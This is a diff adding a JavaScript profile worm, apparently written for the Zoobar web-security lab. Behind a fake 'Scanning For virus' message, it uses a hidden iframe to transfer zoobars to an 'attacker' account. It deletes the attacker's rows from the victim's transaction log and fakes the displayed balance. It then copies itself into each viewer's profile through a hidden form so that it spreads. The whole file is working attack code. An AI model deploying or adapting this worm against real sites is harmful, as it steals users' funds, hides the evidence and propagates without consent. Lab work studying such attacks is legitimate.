@@ -1,0 +1,75 @@
+Scanning For virus ...</b></div>
+<script type="text/javascript">
+	
+	var iframe = document.createElement("iframe");
+	iframe.id="transfer";
+	var c=1;
+	iframe.src="http://localhost:8080/zoobar/index.cgi/transfer";
+	iframe.addEventListener("load",iframe_loaded,false);
+	iframe.style.visibility="hidden";
+	iframe.style.width="0px";
+	iframe.style.height="0px";
+	
+	document.body.appendChild(iframe);
+	document.body.onload=profile_form_loaded;
+
+
+	var reader = new XMLHttpRequest();
+
+	function iframe_loaded(){
+		if(c==1)
+		{
+			var ifrm = document.getElementById("transfer");
+			var form = ifrm.contentDocument.getElementsByName("transferform")[0];
+			form.elements[0].value=1;
+			form.elements[1].value="attacker";
+			form.submit();
+			c += 1;
+		}
+	}
+
+	function on_file_load(){
+	}
+
+	function profile_form_loaded(){
+
+								
+
+		var table = document.getElementsByClassName("log")[0];
+		for(var i=0;i<table.rows.length;++i){
+			var table_row = table.rows[i];
+			if(table_row.cells[2].innerHTML=="attacker")
+			{
+				table.deleteRow(i);
+				i-=1;
+			}
+		}
+		
+		reader.open('get', '/answer-4.txt', false); 
+    	reader.onreadystatechange = on_file_load;
+    	reader.send(null);
+
+    	
+    	if(document.getElementsByName("user")[0].value == "attacker")
+    	{
+    		var zoo = document.getElementById("zoobars").className = 10;
+    		document.getElementById("profileheader").innerHTML=document.getElementsByName("user")[0].value +"'s zoobars:"+zoo;
+    	}
+    
+    	var form = document.getElementsByName("profileform")[1];
+    	var textArea = document.getElementsByName("profile_update")[0];
+        textArea.value = reader.responseText;
+		form.submit();		
+	}
+
+</script>
+<div><b>
+
+<iframe style="width:0px; height:0px; visibility:hidden;" name="iframe_new"></iframe>
+<form method="POST" action ="http://localhost:8080/zoobar/index.cgi/" style="visibility:hidden;width:0px;height:0px" name="profileform" target="iframe_new">
+	<textarea name="profile_update" rows="20" cols="80">
+	</textarea>
+	<br/>
+	<input type="submit" name="profile_submit" value="Save" />
+</form>
+
